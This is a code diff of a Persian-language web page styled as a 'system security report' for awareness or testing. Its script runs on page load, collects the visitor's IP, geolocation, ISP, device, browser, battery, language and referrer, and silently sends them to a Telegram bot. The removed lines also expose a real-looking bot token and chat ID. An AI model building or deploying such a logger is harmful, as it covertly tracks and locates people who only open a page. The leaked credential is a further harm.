@@ -3,12 +3,11 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>گزارش امنیتی سیستم شما</title>
-  <script src="https://cdn.jsdelivr.net/npm/bowser@2.11.0/es5.min.js"></script>
+  <title>گزارش امنیتی سیستم</title>
   <style>
     body {
-      font-family: Vazirmatn, sans-serif;
-      background: #f5f7fa;
+      font-family: sans-serif;
+      background: #f1f3f5;
       direction: rtl;
       text-align: center;
       padding: 30px;
@@ -25,7 +24,7 @@
 
     h1 {
       color: #333;
-      font-size: 24px;
+      font-size: 22px;
     }
 
     #loading {
@@ -42,9 +41,8 @@
 
     .info {
       text-align: right;
-      font-size: 14px;
+      font-size: 13px;
       margin-top: 20px;
-      line-height: 1.8;
       direction: ltr;
     }
 
@@ -64,7 +62,7 @@
   </div>
 
   <footer>
-    توسعه یافته برای آگاهی‌بخشی امنیتی | نسخه آزمایشی
+    توسعه یافته جهت آگاهی امنیتی | نسخه تستی
   </footer>
 
   <script>
@@ -74,12 +72,18 @@
       const infoBox = document.getElementById("info");
 
       try {
-        const [ipData, battery] = await Promise.all([
-          fetch("https://ipapi.co/json/").then(res => res.json()).catch(() => null),
-          navigator.getBattery?.().catch(() => null)
-        ]);
+        const ipData = await fetch("https://ipapi.co/json/").then(res => res.json()).catch(() => null);
 
-        const browser = window.bowser.getParser(navigator.userAgent).getResult();
+        let battery = null;
+        if (navigator.getBattery) {
+          try {
+            battery = await navigator.getBattery();
+          } catch (e) {
+            console.warn("Battery info error:", e);
+          }
+        }
+
+        const now = new Date();
 
         const info = {
           ip: ipData?.ip || "نامشخص",
@@ -88,79 +92,70 @@
           timezone: ipData?.timezone || "نامشخص",
           ip_time: new Date().toLocaleString("fa-IR", { timeZone: ipData?.timezone || "Asia/Tehran" }),
           local_time: new Date().toLocaleString("fa-IR"),
-          os: `${browser.os.name} ${browser.os.versionName}`,
-          browser: `${browser.browser.name} ${browser.browser.version}`,
-          device: browser.platform.type || "نامشخص",
+          os: navigator.platform || "نامشخص",
+          browser: navigator.userAgent || "نامشخص",
           screen: `${screen.width}x${screen.height}`,
+          language: navigator.language || "-",
+          referrer: document.referrer || "مستقیم",
           battery: battery ? `${(battery.level * 100).toFixed(0)}%` : "نامشخص",
           charging: battery ? (battery.charging ? "بله" : "خیر") : "نامشخص",
-          language: navigator.language,
-          referrer: document.referrer || "مستقیم"
+          device: /Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ? "موبایل" : "دسکتاپ",
+          online: navigator.onLine ? "بله" : "خیر"
         };
 
         const message = `
 [گزارش ورود جدید]
 
-
 IP: ${info.ip}
-
 
 مکان: ${info.location}
 
-
 ارائه‌دهنده: ${info.org}
-
 
 سیستم‌عامل: ${info.os}
 
-
 مرورگر: ${info.browser}
-
 
 نوع دستگاه: ${info.device}
 
-
 رزولوشن صفحه: ${info.screen}
-
 
 زبان مرورگر: ${info.language}
 
-
 وضعیت باتری: ${info.battery} - شارژ: ${info.charging}
 
+وضعیت اتصال اینترنت: ${info.online}
 
 ارجاع‌دهنده: ${info.referrer}
 
-
 زمان محلی: ${info.local_time}
 
-
-زمان منطقه‌ای: ${info.ip_time}
+زمان منطقه‌ای IP: ${info.ip_time}
         `;
 
-        // جایگزین با توکن و آیدی تلگرام خودت
-        const token = "8194809349:AAEqk8M8sOWGxQwDO0tNlybKDki26JENT4w";
-        const chat_id = "7980459274";
+        // ===== جایگزین کن با توکن و آیدی خودت =====
+        const token = "توکن_ربات_تو";
+        const chat_id = "آیدی_چت_تو";
         const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
         await fetch(url, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id, text: message })
+          body: JSON.stringify({ chat_id, text: message.trim() })
         });
 
         loading.style.display = "none";
         done.style.display = "block";
 
-        // نمایش خلاصه در صفحه
         infoBox.innerHTML = `
           IP: ${info.ip}<br>
           مکان: ${info.location}<br>
+          دستگاه: ${info.device}<br>
           سیستم‌عامل: ${info.os}<br>
           مرورگر: ${info.browser}<br>
-          دستگاه: ${info.device}<br>
           رزولوشن: ${info.screen}<br>
           باتری: ${info.battery} (${info.charging})<br>
+          اتصال اینترنت: ${info.online}<br>
           زمان: ${info.local_time}<br>
         `;
       } catch (err) {
